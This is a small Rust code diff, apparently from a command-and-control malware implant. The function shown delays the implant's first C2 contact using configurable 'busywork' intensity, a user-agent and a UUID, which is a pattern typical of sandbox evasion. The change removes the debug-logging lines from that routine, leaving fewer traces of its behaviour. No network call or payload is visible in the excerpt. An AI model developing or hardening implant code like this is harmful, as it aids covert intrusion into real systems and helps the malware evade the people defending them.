@@ -36,13 +36,7 @@ fn to_intensity(l: Level) -> Option<Intensity> {
 /// Startup delay before first C2 contact — uses the configured intensity.
 pub fn startup_delay() {
     let l = level();
-    crate::dlog!(
-        "startup_delay: configured={} resolved={:?}",
-        config::busywork_intensity,
-        l
-    );
     let Some(i) = to_intensity(l) else {
-        crate::dlog!("startup_delay: skipped (off)");
         return;
     };
     let uuid = config::UUID.read().unwrap();
@@ -53,7 +47,6 @@ pub fn startup_delay() {
             .feed(config::user_agent)
             .run(),
     );
-    crate::dlog!("startup_delay: done");
 }
 
 /// Sleep replacement between tasking rounds.
